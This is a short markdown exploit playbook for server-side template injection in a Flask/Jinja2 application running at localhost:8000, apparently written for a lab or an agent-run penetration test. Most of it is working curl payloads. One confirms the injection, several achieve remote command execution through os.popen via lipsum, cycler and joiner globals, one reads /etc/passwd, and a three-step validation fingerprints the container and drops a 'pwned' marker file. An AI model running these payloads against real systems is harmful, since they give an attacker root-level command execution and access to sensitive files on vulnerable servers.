# Flask SSTI Exploit Playbook

**CVE**: N/A (Server-Side Template Injection in Jinja2)
**Target**: http://localhost:8000
**Vulnerability**: User input passed directly to Jinja2 Template() constructor
**Authentication**: None required

## Detection

Send a math expression to confirm SSTI:

```bash
curl -s 'http://localhost:8000/?name={{7*7}}'
```

Expected: Response contains `Hello 49`.

## RCE Payload

Execute OS command via `os.popen()`:

```bash
CMD="id"
curl -s "http://localhost:8000/?name={{ lipsum.__globals__[\"os\"].popen(\"${CMD}\").read() }}"
```

Alternative payloads (same effect):

```bash
# Via cycler
curl -s "http://localhost:8000/?name={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Via joiner
curl -s "http://localhost:8000/?name={{ joiner.__init__.__globals__.os.popen('id').read() }}"

# Via class hierarchy
curl -s "http://localhost:8000/?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
```

## Exploit Mechanism

| Step | Action | Detail |
|------|--------|--------|
| 1 | GET /?name={{...}} | `name` parameter passed to Jinja2 `Template()` |
| 2 | Jinja2 evaluates `{{ }}` | Python expression evaluation inside template |
| 3 | `lipsum.__globals__["os"]` | Access `os` module via Jinja2 context object |
| 4 | `.popen("cmd").read()` | Execute command and read output |

## Validation (3-Layer)

```bash
# L1 — Marker file absence
curl -s 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL").read() }}'

# L2 — Environment fingerprint
curl -s 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("ip a | grep 172.").read() }}'

# L3 — Unique artifact
curl -s 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("touch /tmp/pwned_$(date +%s_%N)").read() }}'
```

## Notes

- Flask 1.1.1 with Jinja2 2.10
- Vulnerable code: `Template("Hello " + name).render()`
- Commands run as `root` inside the Flask container
- No filtering on `_`, `[]`, or `.` — full SSTI exploitation available
